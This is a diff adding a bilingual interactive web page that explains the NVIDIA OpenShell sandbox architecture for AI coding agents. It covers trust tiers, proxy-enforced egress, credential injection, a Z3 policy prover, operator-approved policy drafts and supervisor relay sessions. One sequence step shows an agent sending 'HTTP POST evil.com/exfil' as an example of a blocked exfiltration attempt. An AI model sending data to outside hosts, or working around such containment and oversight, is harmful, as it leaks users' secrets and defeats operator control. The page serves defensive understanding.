Cisco, CrowdStrike, SpaceXAI, Salesforce, SAP, …; “over 100 organisations” in aggregate, with verb strengths from <em>deployed</em> to <em>exploring</em>), while Google Cloud and TrendAI appear in the broader 2026-10-21 Reference Architecture release. “Partner” never means “deployed customer” — preserve the original verb strength when quoting.</p></div>
+      </details>
+    </section>
+
+    </main>
+  </div>
+
+  <footer>
+    <div class="wrap" style="padding:0">
+      <p data-en="Sources (checked 2026-10-29). D0003 is the user's own architecture note and the spine of this page; the verified research report supplied evidence grading and the corrections flagged inline. Where the two conflict, both readings are shown — never silently merged." data-zh="來源（查核日 2026-10-29）。D0003 是使用者自家的架構筆記，也是本頁主軸；查證研究報告提供證據分級與內文標示的各項更正。兩者衝突之處並列呈現——從不默默合併。">Sources (checked 2026-10-29). D0003 is the user's own architecture note and the spine of this page; the verified research report supplied evidence grading and the corrections flagged inline. Where the two conflict, both readings are shown — never silently merged.</p>
+      <div class="src-list">
+        <p>· NVIDIA — <a href="https://developer.nvidia.com/blog/add-runtime-controls-to-ai-agents-with-nvidia-openshell/" target="_blank" rel="noopener">Add Runtime Controls to AI Agents with NVIDIA OpenShell</a> (2026-09-28, updated 2026-10-15)</p>
+        <p>· NVIDIA — <a href="https://www.nvidia.com/en-us/solutions/ai/agent-safety/" target="_blank" rel="noopener">Open Agent Safety Platform</a> (product page + FAQ)</p>
+        <p>· NVIDIA — <a href="https://docs.nvidia.com/openshell/latest/about/architecture" target="_blank" rel="noopener">OpenShell architecture docs</a> · <a href="https://github.com/NVIDIA/OpenShell" target="_blank" rel="noopener">GitHub: NVIDIA/OpenShell</a></p>
+        <p>· NVIDIA — <a href="http://www.stockwatch.com/news/item/u-z9834849-u!nvda-20260928/u/nvda" target="_blank" rel="noopener">2026-09-28 launch release</a> (via Stockwatch / GlobeNewswire)</p>
+        <p>· NVIDIA — <a href="https://www.tradingview.com/news/globenewswire:8769c77c4094b:0-nvidia-launches-openshell-reference-architecture-for-safe-ai-agents/" target="_blank" rel="noopener">2026-10-21 OpenShell Reference Architecture release</a> (via TradingView)</p>
+        <p>· NVIDIA docs — <a href="https://docs.nvidia.com/openshell/v0.1.2/about/support-matrix" target="_blank" rel="noopener">Support Matrix (v0.1.2)</a> · <a href="https://docs.nvidia.com/openshell/v0.1.2/how-it-works/policies/advisor" target="_blank" rel="noopener">Policy Advisor (v0.1.2)</a></p>
+        <p>· NVIDIA — <a href="https://docs.nvidia.com/nemoclaw/latest/user-guide/openclaw/home" target="_blank" rel="noopener">NemoClaw docs</a></p>
+        <p>· Sorami — <a href="https://sorami.com.au/research/nvidia-openshell-agent-sandbox-test/" target="_blank" rel="noopener">Independent v0.1.2 test</a> (non-peer-reviewed)</p>
+      </div>
+      <p style="margin-top:14px" data-en="Version note: 0.1.0 is the launch version (2026-09-28 materials); docs read v0.1.6 when checked on 2026-10-29. Pin a version before treating any field-level detail here as current." data-zh="版本註記：0.1.0 是發表版本（2026-09-28 材料）；2026-10-29 實查文件為 v0.1.6。將本頁任何欄位級細節視為現行規格前，請先鎖定版本。">Version note: 0.1.0 is the launch version (2026-09-28 materials); docs read v0.1.6 when checked on 2026-10-29. Pin a version before treating any field-level detail here as current.</p>
+    </div>
+  </footer>
+</div>
+
+<script>
+(function(){
+"use strict";
+var lang = "en";
+
+/* ---------- language toggle ---------- */
+var i18nEls = Array.prototype.slice.call(document.querySelectorAll("[data-en]"));
+i18nEls.forEach(function(el){ el.setAttribute("data-en-html", el.innerHTML); });
+var phEl = document.getElementById("searchInput");
+
+var TIER = {
+  gateway: {
+    en: { title:"Gateway — fully trusted, outside the sandbox",
+      body:"<p><strong>What lives here:</strong> sandbox lifecycle, the provider credential registry, the policy store, auth (OIDC / K8s SA / Cloudflare JWT), the compute-driver layer, the policy prover and durable state (sandboxes, policies, providers, settings).</p><p><strong>Hard rules:</strong> it is the <em>only</em> credential issuer; it never initiates a connection into a sandbox; all relays (SSH, exec, TCP) arrive over the supervisor's outbound stream.</p><p><strong>State:</strong> <code>ServerState</code> — store (SQLx), compute runtime, sandbox index/watch bus, supervisor session registry, OIDC JWKS cache, sandbox JWT issuer + authenticator, K8s SA authenticator.</p>"},
+    zh: { title:"Gateway——完全受信任，位於 sandbox 之外",
+      body:"<p><strong>這裡放什麼：</strong>sandbox 生命週期、provider 憑證 registry、policy store、auth（OIDC / K8s SA / Cloudflare JWT）、compute-driver 層、policy prover 與 durable state（sandboxes、policies、providers、settings）。</p><p><strong>硬規則：</strong>它是<em>唯一</em>的憑證簽發者；永不主動向 sandbox 內發起連線；所有 relay（SSH、exec、TCP）都經 supervisor 的 outbound stream 抵達。</p><p><strong>狀態：</strong><code>ServerState</code>——store（SQLx）、compute runtime、sandbox index/watch bus、supervisor session registry、OIDC JWKS cache、sandbox JWT issuer + authenticator、K8s SA authenticator。</p>"}
+  },
+  supervisor: {
+    en: { title:"Supervisor — semi-trusted (D0003) · the trusted side in NVIDIA's framing",
+      body:"<p><strong>What lives here:</strong> the Process Supervisor (Landlock LSM, seccomp BPF, cap_drop, uid=sandbox), the Network Supervisor (netns, nftables REDIRECT, OPA L7 proxy, TLS termination, credential injection/rewriting), the inference router at <code>inference.local</code>, the OCSF logger, log-push and the SSH server.</p><p><strong>Channel:</strong> one mutually authenticated HTTP/2 stream to the Gateway (OpenShell Sandbox Protocol). Supervisor disconnect ⇒ the agent freezes; only the same supervisor process can reconnect and resume it.</p><p><strong>Why “semi”:</strong> it runs <em>inside</em> the sandbox boundary as PID 1 — privileged against the agent, exposed in a way the Gateway is not.</p>"},
+    zh: { title:"Supervisor——半受信任（D0003）· NVIDIA 說法中的受信任側",
+      body:"<p><strong>這裡放什麼：</strong>Process Supervisor（Landlock LSM、seccomp BPF、cap_drop、uid=sandbox）、Network Supervisor（netns、nftables REDIRECT、OPA L7 proxy、TLS termination、憑證注入／重寫）、位於 <code>inference.local</code> 的 inference router、OCSF logger、log-push 與 SSH server。</p><p><strong>通道：</strong>一條與 Gateway 相互驗證的 HTTP/2 stream（OpenShell Sandbox Protocol）。Supervisor 斷線 ⇒ agent 凍結；只有同一個 supervisor 程序能重連恢復。</p><p><strong>為何是「半」：</strong>它以 PID 1 跑在 sandbox 邊界<em>之內</em>——對 agent 有特權，但暴露程度不同於 Gateway。</p>"}
+  },
+  agent: {
+    en: { title:"Agent process — untrusted, and holding nothing worth stealing",
+      body:"<p><strong>What lives here:</strong> the agent itself (Claude Code, Codex, OpenCode, GitHub Copilot CLI, OpenClaw per the official FAQ; bring your own harness — the default image is a minimal Ubuntu).</p><p><strong>Constraints:</strong> runs as <code>sandbox:sandbox</code>, never root; file access bounded by Landlock; syscalls filtered by seccomp; the only network path is netns → OPA proxy (<em>deny all egress except to the supervisor</em>); LLM calls intercepted at <code>inference.local</code>.</p><p><strong>Nothing to steal:</strong> no gateway signing key, no gateway JWT, no provider credentials of its own — tokens are bound to a single sandbox and a single run.</p>"},
+    zh: { title:"Agent 程序——不受信任，且不持有值得偷的東西",
+      body:"<p><strong>這裡放什麼：</strong>agent 本身（依官方 FAQ：Claude Code、Codex、OpenCode、GitHub Copilot CLI、OpenClaw；需自帶 harness——預設 image 為 minimal Ubuntu）。</p><p><strong>約束：</strong>以 <code>sandbox:sandbox</code> 執行、永不以 root 執行；檔案存取受 Landlock 限制；syscall 受 seccomp 過濾；唯一網路路徑是 netns → OPA proxy（<em>deny all egress except to the supervisor</em>）；LLM 呼叫在 <code>inference.local</code> 被攔截。</p><p><strong>沒有值得偷的東西：</strong>無 gateway 簽署金鑰、無 gateway JWT、本身不持有 provider 憑證——token 綁定單一 sandbox 與單次 run。</p>"}
+  }
+};
+
+function renderTier(key){
+  var d = TIER[key][lang];
+  document.getElementById("tierDetail").innerHTML = "<h4>"+d.title+"</h4>"+d.body;
+}
+document.querySelectorAll(".tier").forEach(function(btn){
+  btn.addEventListener("click", function(){
+    document.querySelectorAll(".tier").forEach(function(b){ b.classList.remove("sel"); b.setAttribute("aria-pressed","false"); });
+    btn.classList.add("sel"); btn.setAttribute("aria-pressed","true");
+    renderTier(btn.getAttribute("data-tier"));
+  });
+});
+
+/* ---------- sequences ---------- */
+var SEQ = {
+  create: {
+    actors:["Operator","Gateway","Compute Driver","Container / VM","Supervisor","Agent"],
+    steps:[
+      {a:[0,1], f:"Operator → Gateway", en:"CreateSandbox request — image, policy, providers, GPU flag.", zh:"CreateSandbox 請求——image、policy、providers、GPU 旗標。"},
+      {a:[1,2], f:"Gateway → Compute Driver", en:"ValidateSandboxCreate — the driver checks the spec against its backend; returns OK.", zh:"ValidateSandboxCreate——driver 以其 backend 檢查 spec；回傳 OK。"},
+      {a:[1], f:"Gateway", en:"Compose the policy: base policy + provider policy layers (each provider adds its network rules).", zh:"組合政策：base policy + provider policy layer（每個 provider 加入其網路規則）。"},
+      {a:[1], f:"Gateway", en:"Mint the sandbox JWT — bound to this sandbox and this run.", zh:"簽發 sandbox JWT——綁定此 sandbox 與此次 run。"},
+      {a:[1], f:"Gateway", en:"Materialise credentials as environment variables into DriverSandboxSpec.environment — never into the image.", zh:"將憑證 materialise 為環境變數，寫入 DriverSandboxSpec.environment——永不寫入 image。"},
+      {a:[1,2], f:"Gateway → Compute Driver", en:"CreateSandbox(spec) — spec carries the token, env, template, resources and driver config.", zh:"CreateSandbox(spec)——spec 帶有 token、env、template、resources 與 driver config。"},
+      {a:[2,3], f:"Compute Driver → Container / VM", en:"Create the container or VM on the selected backend (Docker / Podman / K8s pod / libkrun MicroVM).", zh:"在選定 backend 上建立 container 或 VM（Docker / Podman / K8s pod / libkrun MicroVM）。"},
+      {a:[3,4], f:"Container / VM → Supervisor", en:"The Supervisor starts as PID 1 (init) inside the sandbox boundary.", zh:"Supervisor 在 sandbox 邊界內以 PID 1（init）啟動。"},
+      {a:[4], f:"Supervisor", en:"Load policy → apply Landlock → apply seccomp + cap_drop → create netns + nftables → start the OPA proxy and the inference router.", zh:"載入 policy → 套用 Landlock → 套用 seccomp + cap_drop → 建立 netns + nftables → 啟動 OPA proxy 與 inference router。"},
+      {a:[4,1], f:"Supervisor → Gateway", en:"ConnectSupervisor (outbound gRPC): SupervisorHello with the sandbox JWT → Gateway validates, binds sandbox_id → SessionAccepted.", zh:"ConnectSupervisor（outbound gRPC）：SupervisorHello 附 sandbox JWT → Gateway 驗證並綁定 sandbox_id → SessionAccepted。"},
+      {a:[4,5], f:"Supervisor → Agent", en:"Fetch provider environment, build child_env, spawn the agent process as a child — as sandbox:sandbox.", zh:"取得 provider environment、建構 child_env、以 sandbox:sandbox 將 agent 作為 child 程序啟動。"},
+      {a:[5], f:"Agent", en:"The agent runs constrained: kernel denies out-of-policy syscalls and file access; the proxy is its only network path.", zh:"Agent 在約束下執行：核心拒絕超出政策的 syscall 與檔案存取；proxy 是它唯一的網路路徑。"}
+    ]
+  },
+  allow: {
+    actors:["Agent","OPA Proxy","Policy Engine","External API","OCSF Logger"],
+    steps:[
+      {a:[0,1], f:"Agent → OPA Proxy", en:"HTTP GET api.github.com — the agent cannot send it directly; nftables REDIRECT forces it into the proxy.", zh:"HTTP GET api.github.com——agent 無法直送；nftables REDIRECT 強制將流量導入 proxy。"},
+      {a:[1,2], f:"OPA Proxy → Policy Engine", en:"Evaluate the compiled OPA/Rego policy for this outbound request.", zh:"對此 outbound request 評估編譯後的 OPA/Rego 政策。"},
+      {a:[2], f:"Policy Engine", en:"Checks, in order: 1) host in policy? 2) port allowed? 3) method allowed? 4) path matches a rule? 5) any deny rule hits? 6) is this binary allowed on this endpoint?", zh:"依序檢查：1) host 在政策內？2) port 允許？3) method 允許？4) path 符合規則？5) 是否命中 deny rule？6) 此 binary 是否被允許使用此 endpoint？"},
+      {a:[2,1], f:"Policy Engine → OPA Proxy", en:"ALLOW.", zh:"ALLOW（放行）。"},
+      {a:[1,3], f:"OPA Proxy → External API", en:"TLS terminate, inject the gateway-managed credential for this approved endpoint, forward the request.", zh:"TLS terminate，注入此已批准端點的 Gateway 管理憑證，轉送請求。"},
+      {a:[3,0], f:"External API → Agent", en:"200 OK — returned through the proxy; the agent never held the real credential.", zh:"200 OK——經 proxy 回傳；agent 從未持有真憑證。"},
+      {a:[1,4], f:"OPA Proxy → OCSF Logger", en:"Emit HttpActivityEvent (severity: Informational) — the allow decision joins the OCSF audit trail.", zh:"發出 HttpActivityEvent（severity：Informational）——放行決策寫入 OCSF 稽核軌跡。"}
+    ]
+  },
+  deny: {
+    actors:["Agent","OPA Proxy","Policy Engine","OCSF Logger","Gateway (drafts)"],
+    steps:[
+      {a:[0,1], f:"Agent → OPA Proxy", en:"HTTP POST evil.com/exfil — redirected into the proxy like every other request; there is no side channel.", zh:"HTTP POST evil.com/exfil——與其他請求一樣被導入 proxy；沒有側路。"},
+      {a:[1,2], f:"OPA Proxy → Policy Engine", en:"Evaluate policy for the request.", zh:"對此請求評估政策。"},
+      {a:[2,1], f:"Policy Engine → OPA Proxy", en:"DENY — the host is not in network_policies. The restrictive default does the work: unlisted means blocked.", zh:"DENY——host 不在 network_policies 內。由限制性預設發揮作用：未列出即阻擋。"},
+      {a:[1,0], f:"OPA Proxy → Agent", en:"403 returned to the agent. The request never left the sandbox.", zh:"回傳 403 給 agent。請求從未離開 sandbox。"},
+      {a:[1,3], f:"OPA Proxy → OCSF Logger", en:"Emit HttpActivityEvent (severity: Medium, disposition: Blocked) — a denial means enforcement is working as intended.", zh:"發出 HttpActivityEvent（severity：Medium、disposition：Blocked）——拒絕代表強制執行如預期運作。"},
+      {a:[1,3], f:"OPA Proxy → OCSF Logger", en:"Dual-emit: the same event is also emitted as a DetectionFindingEvent with an ATT&CK mapping, so it reaches the security alert pipeline too.", zh:"Dual-emit：同一事件另以帶 ATT&CK 對照的 DetectionFindingEvent 發出，讓它同時抵達安全警報管線。"},
+      {a:[1,4], f:"OPA Proxy → Gateway", en:"The denial is aggregated by the denial aggregator and submitted via SubmitPolicyAnalysis.", zh:"拒絕事件由 denial aggregator 彙總，經 SubmitPolicyAnalysis 送交 Gateway。"},
+      {a:[4], f:"Gateway (drafts)", en:"Gateway builds a draft policy chunk — the addition that would allow this traffic — with hit_count and the prover's validation_result, for operator approve / reject / edit. The agent cannot approve it itself.", zh:"Gateway 建成 draft policy chunk——即能放行此流量的政策增補——附 hit_count 與 prover 的 validation_result，供操作者 approve / reject / edit。Agent 不能自行批准。"}
+    ]
+  },
+  prover: {
+    actors:["Operator","CLI / CI Pipeline","Z3 Prover","Gateway"],
+    steps:[
+      {a:[0,1], f:"Operator → CLI / CI Pipeline", en:"Deploy a policy — the pipeline runs the prover before anything reaches the Gateway.", zh:"部署政策——pipeline 在任何東西抵達 Gateway 之前先跑 prover。"},
+      {a:[1,2], f:"CLI / CI Pipeline → Z3 Prover", en:"prove(policy_path, credentials_path, registry_dir, accepted_risks_path, compact).", zh:"prove(policy_path, credentials_path, registry_dir, accepted_risks_path, compact)。"},
+      {a:[2], f:"Z3 Prover", en:"parse_policy() → load_credentials() → load_registry() → build_model(): the policy, credential set and binary registry become Z3 SMT constraints.", zh:"parse_policy() → load_credentials() → load_registry() → build_model()：政策、憑證集與 binary registry 轉為 Z3 SMT 約束。"},
+      {a:[2], f:"Z3 Prover", en:"run_all_queries() — check LINK_LOCAL_REACH, L7_BYPASS_CREDENTIALED, CREDENTIAL_REACH_EXPANSION and CAPABILITY_EXPANSION against the operator-defined boundary.", zh:"run_all_queries()——對照 operator-defined boundary，檢查 LINK_LOCAL_REACH、L7_BYPASS_CREDENTIALED、CREDENTIAL_REACH_EXPANSION 與 CAPABILITY_EXPANSION。"},
+      {a:[2,1,3], f:"Z3 Prover → CLI → Gateway", en:"Pass path: exit 0 (no critical/high findings) → the CLI applies the policy → Gateway stores and distributes it. Policy deployed.", zh:"通過路徑：exit 0（無 critical/high finding）→ CLI 套用政策 → Gateway 儲存並分發。政策部署完成。"},
+      {a:[2,1,0], f:"Z3 Prover → CLI → Operator", en:"Fail path: exit 1 — e.g. CREDENTIAL_REACH_EXPANSION found → BLOCKED. Fix the credential scope and re-prove; a failing policy never reaches a sandbox. (Exit 2 = input error. Findings listed in an accepted_risks file are reported but do not fail the run.)", zh:"失敗路徑：exit 1——例如發現 CREDENTIAL_REACH_EXPANSION → BLOCKED（阻擋）。修正憑證範圍並重新 prove；未通過的政策永遠到不了 sandbox。（Exit 2 = 輸入錯誤。列於 accepted_risks 檔案的 finding 會被報告，但不令執行失敗。）"}
+    ]
+  },
+  session: {
+    actors:["Supervisor","Gateway","Operator"],
+    steps:[
+      {a:[0,1], f:"Supervisor → Gateway", en:"ConnectSupervisor — the supervisor dials out over gRPC. The Gateway never dials in; this is what makes NAT, firewalls and air-gapped deployments work.", zh:"ConnectSupervisor——supervisor 經 gRPC 向外撥出。Gateway 永不向內撥入；這正是 NAT、防火牆與 air-gapped 部署可行的原因。"},
+      {a:[0,1], f:"Supervisor → Gateway", en:"SupervisorHello { sandbox_id, capabilities } — presented with the gateway-minted sandbox JWT.", zh:"SupervisorHello { sandbox_id, capabilities }——連同 Gateway 簽發的 sandbox JWT 一併出示。"},
+      {a:[1], f:"Gateway", en:"Validate the JWT and bind sandbox_id to the session. From here, the IDOR invariant holds: the bound id must match every request body.", zh:"驗證 JWT 並將 sandbox_id 綁定到 session。此後 IDOR 不變量成立：綁定的 id 必須與每個 request body 一致。"},
+      {a:[1,0], f:"Gateway → Supervisor", en:"SessionAccepted { session_id } — or SessionRejected { reason }.", zh:"SessionAccepted { session_id }——或 SessionRejected { reason }。"},
+      {a:[0,1], f:"Supervisor ↔ Gateway", en:"Steady state: SupervisorHeartbeat ↔ GatewayHeartbeat keep the stream alive.", zh:"穩定狀態：SupervisorHeartbeat ↔ GatewayHeartbeat 維持 stream 存活。"},
+      {a:[2,1], f:"Operator → Gateway", en:"The operator requests an SSH session into the sandbox (CreateSshSession).", zh:"操作者請求進入 sandbox 的 SSH session（CreateSshSession）。"},
+      {a:[1,0], f:"Gateway → Supervisor", en:"RelayOpen { channel: ssh } — sent down the existing outbound stream; no new inbound connection is opened.", zh:"RelayOpen { channel: ssh }——沿既有 outbound stream 送下；不開啟任何新的 inbound 連線。"},
+      {a:[0,1], f:"Supervisor → Gateway", en:"RelayOpenResult { ok, channel_id } — the first relay frame is a RelayInit carrying the channel_id; later frames are raw bytes.", zh:"RelayOpenResult { ok, channel_id }——relay 的第一個 frame 是帶 channel_id 的 RelayInit；後續 frame 為原始 bytes。"},
+      {a:[0,1], f:"Supervisor ↔ Gateway", en:"Multiplexed relay frames: SSH data (and equally exec or TCP forwarding) rides the same single gRPC stream, separated by channel_id.", zh:"多工 relay frame：SSH 資料（exec 與 TCP forwarding 亦然）共乘同一條 gRPC stream，以 channel_id 區分。"},
+      {a:[1,0], f:"Gateway → Supervisor", en:"RelayClose { channel_id } — either side can close a channel without tearing down the session.", zh:"RelayClose { channel_id }——任一方都能關閉 channel，不必拆掉整個 session。"}
+    ]
+  }
+};
+var seqKey = "create", seqIdx = 0, seqTimer = null;
+
+function renderSeq(){
+  var sc = SEQ[seqKey];
+  var actorsEl = document.getElementById("seqActors");
+  var step = sc.steps[seqIdx];
+  actorsEl.innerHTML = "";
+  sc.actors.forEach(function(name, i){
+    var s = document.createElement("span");
+    s.className = "seq-actor" + (step.a.indexOf(i) >= 0 ? " on" : "");
+    s.textContent = name;
+    actorsEl.appendChild(s);
+  });
+  document.getElementById("seqFromTo").textContent = step.f;
+  document.getElementById("seqText").textContent = step[lang];
+  document.getElementById("seqProgress").textContent =
+    (lang === "zh" ? "步驟 " : "Step ") + (seqIdx+1) + " / " + sc.steps.length;
+  var dots = document.getElementById("seqDots");
+  dots.innerHTML = "";
+  sc.steps.forEach(function(_, i){
+    var b = document.createElement("button");
+    b.className = i === seqIdx ? "on" : (i < seqIdx ? "done" : "");
+    b.setAttribute("aria-label", "Step " + (i+1));
+    b.addEventListener("click", function(){ stopPlay(); seqIdx = i; renderSeq(); });
+    dots.appendChild(b);
+  });
+  document.getElementById("seqPrev").disabled = seqIdx === 0;
+  document.getElementById("seqNext").disabled = seqIdx === sc.steps.length - 1;
+}
+function stopPlay(){
+  if (seqTimer){ clearInterval(seqTimer); seqTimer = null;
+    var pb = document.getElementById("seqPlay");
+    pb.textContent = lang === "zh" ? "▶ 自動播放" : "▶ Auto-play"; }
+}
+document.getElementById("seqPrev").addEventListener("click", function(){ stopPlay(); if (seqIdx>0){ seqIdx--; renderSeq(); } });
+document.getElementById("seqNext").addEventListener("click", function(){ stopPlay(); if (seqIdx<SEQ[seqKey].steps.length-1){ seqIdx++; renderSeq(); } });
+document.getElementById("seqPlay").addEventListener("click", function(){
+  if (seqTimer){ stopPlay(); return; }
+  var pb = this;
+  pb.textContent = lang === "zh" ? "⏸ 暫停" : "⏸ Pause";
+  seqTimer = setInterval(function(){
+    if (seqIdx >= SEQ[seqKey].steps.length - 1){ stopPlay(); return; }
+    seqIdx++; renderSeq();
+  }, 2400);
+});
+document.querySelectorAll("#seqTabs [data-seq]").forEach(function(btn){
+  btn.addEventListener("click", function(){
+    document.querySelectorAll("#seqTabs [data-seq]").forEach(function(b){ b.setAttribute("aria-selected","false"); });
+    btn.setAttribute("aria-selected","true");
+    stopPlay(); seqKey = btn.getAttribute("data-seq"); seqIdx = 0; renderSeq();
+  });
+});
+
+/* ---------- policy domain tabs ---------- */
+document.querySelectorAll("[data-tab]").forEach(function(btn){
+  btn.addEventListener("click", function(){
+    document.querySelectorAll("[data-tab]").forEach(function(b){ b.setAttribute("aria-selected","false"); });
+    btn.setAttribute("aria-selected","true");
+    var key = btn.getAttribute("data-tab");
+    document.querySelectorAll("[data-panel]").forEach(function(p){ p.hidden = p.getAttribute("data-panel") !== key; });
+  });
+});
+
+/* ---------- search filter ---------- */
+var searchInput = document.getElementById("searchInput");
+searchInput.addEventListener("input", function(){
+  var q = searchInput.value.trim().toLowerCase();
+  document.querySelectorAll("table.filterable").forEach(function(tbl){
+    var visible = 0;
+    tbl.querySelectorAll("tbody tr").forEach(function(tr){
+      var hit = !q || tr.textContent.toLowerCase().indexOf(q) >= 0;
+      tr.style.display = hit ? "" : "none";
+      tr.classList.toggle("hl-row", !!q && hit);
+      if (hit) visible++;
+    });
+    var sec = tbl.closest("section");
+    if (sec){
+      sec.querySelectorAll(".noresult").forEach(function(nr){
+        nr.style.display = (q && visible === 0) ? "block" : "none";
+      });
+    }
+  });
+});
+
+/* ---------- language apply ---------- */
+function setLang(next){
+  lang = next;
+  document.documentElement.lang = lang === "zh" ? "zh-Hant" : "en";
+  document.getElementById("langEn").setAttribute("aria-pressed", lang === "en" ? "true" : "false");
+  document.getElementById("langZh").setAttribute("aria-pressed", lang === "zh" ? "true" : "false");
+  i18nEls.forEach(function(el){
+    if (lang === "zh"){ el.textContent = el.getAttribute("data-zh"); }
+    else { el.innerHTML = el.getAttribute("data-en-html"); }
+  });
+  phEl.placeholder = lang === "zh" ? phEl.getAttribute("data-zh-ph") : phEl.getAttribute("data-en-ph");
+  var sel = document.querySelector(".tier.sel");
+  renderTier(sel ? sel.getAttribute("data-tier") : "gateway");
+  var pb = document.getElementById("seqPlay");
+  if (!seqTimer) pb.textContent = lang === "zh" ? "▶ 自動播放" : "▶ Auto-play";
+  renderSeq();
+}
+document.getElementById("langEn").addEventListener("click", function(){ setLang("en"); });
+document.getElementById("langZh").addEventListener("click", function(){ setLang("zh"); });
+
+/* ---------- toc active state ---------- */
+var tocLinks = Array.prototype.slice.call(document.querySelectorAll("nav.toc a"));
+var obs = new IntersectionObserver(function(entries){
+  entries.forEach(function(e){
+    if (e.isIntersecting){
+      tocLinks.forEach(function(a){ a.classList.toggle("active", a.getAttribute("href") === "#" + e.target.id); });
+    }
+  });
+}, { rootMargin: "-20% 0px -70% 0px" });
+document.querySelectorAll("section.chapter").forEach(function(s){ obs.observe(s); });
+
+renderTier("gateway");
+renderSeq();
+})();
+</script>
+</body>
+</html>
